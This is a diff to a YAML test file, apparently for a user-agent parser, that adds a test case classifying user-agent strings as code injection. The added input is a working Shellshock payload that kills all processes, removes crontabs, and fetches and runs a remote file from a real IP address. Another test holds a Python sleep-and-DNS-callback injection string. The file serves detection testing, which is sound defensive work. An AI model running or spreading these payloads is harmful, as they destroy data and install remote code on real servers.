@@ -881,6 +881,11 @@ config:
 
 - test:
     input:
+      User-Agent: '() { :;};/usr/bin/perl -e ''print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r ; kill -9 -1 ; cd /var/tmp/ ; /usr/bin/wget http://31.184.194.114/404 ; /usr/bin/perl 404 ; lwp-download http://31.184.194.114/404 ; fetch http://31.184.194.114/404 ; curl -O http://31.184.194.114/404 ; /usr/bin/perl 404 ; cd /var/tmp/ ; rm -rf 404*\");'''
+    expected: *isCodeInjection
+
+- test:
+    input:
       user_agent_string: '''+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("xxxxx."+"bxss.me")+'''
     expected:
       DeviceClass                          : 'Hacker'
